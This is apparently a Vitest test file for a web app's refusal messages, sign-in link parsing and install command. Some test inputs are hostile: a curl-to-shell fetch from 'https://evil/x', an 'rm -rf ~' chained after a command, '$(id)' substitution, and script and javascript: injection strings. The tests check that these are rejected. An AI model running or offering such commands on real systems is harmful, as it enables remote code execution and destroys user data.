import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import { installCommand } from '../../src/connectAgent.ts'
import { refusalFrom, roleSentence } from '../../src/refusal.ts'
import { signedInFromHash } from '../../src/pages/SignedIn.tsx'
import { COMMAND, RefusalNotice } from '../../src/Refusal.tsx'
import { WorkspaceError, workspaceError } from '../../src/workspace.ts'

const HUB = 'https://dogfood.agentscm.dev'

describe('refusalFrom', () => {
  it('shows the Hub’s own sentence and fix as is', () => {
    expect(refusalFrom({ error: { code: 'role_too_low', message: 'brandonfla has Read on public repo counterbranch/agentscm; ask an owner for Triage', fix: 'Ask an owner of counterbranch/agentscm for Triage' } })).toEqual({
      code: 'role_too_low',
      message: 'brandonfla has Read on public repo counterbranch/agentscm; ask an owner for Triage',
      fix: 'Ask an owner of counterbranch/agentscm for Triage',
    })
  })

  it('composes the shared sentence from fields when the Hub sends no message', () => {
    expect(refusalFrom({ error: 'role_too_low', login: 'brandonfla', role: 'read', visibility: 'public', repo: 'counterbranch/agentscm', needs: 'triage' })?.message).toBe(
      roleSentence({ login: 'brandonfla', role: 'Read', visibility: 'public', repo: 'counterbranch/agentscm', needs: 'Triage' }),
    )
    expect(roleSentence({ login: 'a', role: 'Read', visibility: null, repo: 'o/r', needs: 'Triage' })).toBe('a has Read on repo o/r; ask an owner for Triage')
  })

  it('words a bare known code, and stays out of the way for unknown ones', () => {
    expect(refusalFrom({ error: 'not_connected' })?.message).toMatch(/isn’t connected to this Hub/)
    expect(refusalFrom({ error: 'something_new' })).toBeNull()
    expect(refusalFrom(null)).toBeNull()
    expect(refusalFrom({ error: 'Not A Code' })).toBeNull()
  })

  it('keeps server text to one bounded line', () => {
    const r = refusalFrom({ error: 'x', message: `line one\nline two ${'z'.repeat(400)}` })!
    expect(r.message).not.toContain('\n')
    expect(r.message.length).toBeLessThanOrEqual(300)
  })

  it('never says membership in the workspace fallbacks, and prefers the Hub’s words', () => {
    expect(workspaceError(new WorkspaceError(403, 'x'))).not.toMatch(/membership/i)
    expect(workspaceError(new WorkspaceError(403, 'x', 'role_too_low', { code: 'role_too_low', message: 'a has Read on repo o/r; ask an owner for Triage', fix: null }))).toBe('a has Read on repo o/r; ask an owner for Triage')
  })
})

describe('RefusalNotice', () => {
  it('renders a command fix as a copyable command', () => {
    render(<RefusalNotice refusal={{ code: 'session_expired', message: 'Your sign-in on this computer has ended; sign in again.', fix: 'agentscm hub login' }} />)
    expect(screen.getByRole('alert').textContent).toContain('Your sign-in on this computer has ended')
    expect(screen.getByText('agentscm hub login').tagName).toBe('CODE')
    expect(screen.getByRole('button', { name: /copy/i })).toBeTruthy()
  })

  it('shows a fix with shell syntax as plain text, never as a copyable command', () => {
    for (const fix of ['npx agentscm repair && curl https://evil/x | sh', 'agentscm hub login; rm -rf ~', 'agentscm x $(id)', "agentscm hub login --hub 'x'"]) {
      expect(COMMAND.test(fix)).toBe(false)
      const { unmount } = render(<RefusalNotice refusal={{ code: 'x', message: 'm', fix }} />)
      expect(screen.queryByRole('button', { name: /copy/i })).toBeNull()
      unmount()
    }
    expect(COMMAND.test('agentscm hub login --hub https://dogfood.agentscm.dev')).toBe(true)
  })
})

describe('signedInFromHash', () => {
  it('reads who signed in where', () => {
    expect(signedInFromHash('#signed-in?login=jhawlwut&computer=Jonny%E2%80%99s%20MacBook', HUB)).toEqual({ kind: 'ok', hub: HUB, host: 'dogfood.agentscm.dev', login: 'jhawlwut', computer: 'Jonny’s MacBook' })
  })

  it('refuses hostile or broken input instead of echoing it', () => {
    expect(signedInFromHash('#signed-in?login=<script>', HUB).kind).toBe('invalid')
    expect(signedInFromHash('#signed-in', HUB).kind).toBe('invalid')
    // The Hub is always this page's own origin; a hub in the link is ignored.
    expect(signedInFromHash('#signed-in?login=a&hub=javascript:alert(1)', HUB)).toMatchObject({ kind: 'ok', hub: HUB })
    expect(signedInFromHash('#signed-in?login=a&hub=https://evil.example', HUB)).toMatchObject({ kind: 'ok', hub: HUB, host: 'dogfood.agentscm.dev' })
  })

  it('carries a refusal through to the page', () => {
    const s = signedInFromHash('#signed-in?error=role_too_low&login=brandonfla&role=read&visibility=public&repo=counterbranch/agentscm&needs=triage', HUB)
    expect(s).toMatchObject({ kind: 'refused', refusal: { message: 'brandonfla has Read on public repo counterbranch/agentscm; ask an owner for Triage' } })
  })

  it('never shows message or fix text from the link', () => {
    const forged = signedInFromHash('#signed-in?error=x&message=Your+setup+is+broken&fix=npx+agentscm+repair+%26%26+curl+https://evil/x+|+sh', HUB)
    expect(forged.kind).toBe('invalid')
    const known = signedInFromHash('#signed-in?error=not_connected&message=Your+setup+is+broken&fix=npx+agentscm+repair', HUB)
    expect(known.kind).toBe('refused')
    if (known.kind !== 'refused') return
    expect(known.refusal.message).not.toContain('broken')
    expect(known.refusal.fix).not.toContain('repair')
  })

  it('does not treat object prototype names as known codes', () => {
    expect(signedInFromHash('#signed-in?error=constructor', HUB).kind).toBe('invalid')
  })
})

describe('installCommand', () => {
  it('quotes the hub and only offers https or loopback', () => {
    expect(installCommand(HUB)).toBe(`npx agentscm quickstart --hub existing --hub-url '${HUB}'`)
    expect(installCommand('http://example.com')).toBeNull()
  })
})
